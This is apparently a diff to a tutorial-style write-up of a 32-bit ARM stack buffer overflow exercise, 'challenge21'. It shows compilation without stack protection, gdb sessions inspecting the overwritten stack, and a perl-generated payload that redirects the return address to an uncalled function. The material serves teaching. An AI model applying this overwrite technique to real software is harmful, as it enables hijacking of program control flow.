@@ -2,6 +2,7 @@
 
 ## file
 
+challenge21.c:
 ```
 #include <stdio.h>
 #include <stdlib.h>
@@ -26,7 +27,7 @@ void main(int argc, char **argv) {
 
 Compile it:
 ```
-gcc -ggdb vuln.c -o vuln -fno-stack-protector
+gcc -ggdb challenge21.c -o challenge21 -fno-stack-protector
 ```
 
 
@@ -34,6 +35,8 @@ gcc -ggdb vuln.c -o vuln -fno-stack-protector
 
 Lets check the main function:
 ```
+$ gdb challenge21
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x000104f4 <+0>:     push    {r7, lr}
@@ -80,9 +83,9 @@ End of assembler dump.
 Breakpoint 1 at 0x104f2: file vuln.c, line 13.
 
 (gdb) run `perl -e 'print "AAAABBBBCCCCDDDDEEEEaaaa"'`
-Starting program: /root/tmp/vuln `perl -e 'print "AAAABBBBCCCCDDDDEEEEaaaa"'`
+Starting program: /root/challenges/challenge21/challenge21 `perl -e 'print "AAAABBBBCCCCDDDDEEEEaaaa"'`
 
-Breakpoint 2, 0x000104f2 in vulnerable (arg=0xfffef93f "AAAABBBBCCCCDDDDEEEEaaaa") at vuln.c:13
+Breakpoint 2, 0x000104f2 in vulnerable (arg=0xfffef93f "AAAABBBBCCCCDDDDEEEEaaaa") at challenge21.c:13
 13      }
 
 (gdb) x/16x $sp
@@ -97,9 +100,9 @@ Compare it with original execution (without overflow):
 (gdb) run `perl -e 'print "AAAABBBBCCCCDDDD"'`
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /root/tmp/vuln `perl -e 'print "AAAABBBBCCCCDDDD"'`
+Starting program: /root/challenges/challenge21/challenge21 `perl -e 'print "AAAABBBBCCCCDDDD"'`
 
-Breakpoint 2, 0x000104f2 in vulnerable (arg=0xfffef947 "AAAABBBBCCCCDDDD") at vuln.c:13
+Breakpoint 2, 0x000104f2 in vulnerable (arg=0xfffef947 "AAAABBBBCCCCDDDD") at challenge21.c:13
 13      }
 (gdb) x/16x $sp
 0xfffef6c8:     0xfffef600      0x0001050b      0xfffef834      0x00000002
@@ -162,13 +165,13 @@ Lets try this:
 
 ```
 (gdb) run `perl -e 'print "AAAABBBBCCCCDDDDEEEE\xb1\x04\x01"'`
-Starting program: /root/tmp/vuln `perl -e 'print "AAAABBBBCCCCDDDDEEEE\xb1\x04\x01"'`
+Starting program: /root/challenges/challenge21/challenge21 `perl -e 'print "AAAABBBBCCCCDDDDEEEE\xb1\x04\x01"'`
 
 I should never be called
 ```
 
 ## Conclusion
 
-Here, Ubuntu 16.04 on arm64 bit behaves pretty much exactly the same as x86.
+Here, Ubuntu 16.04 on arm 32 bit behaves pretty much exactly the same as x86.
 Stack grown down, we have little endianness, and the return address is on the stack.
 The only big difference is the ARM assembly codes.
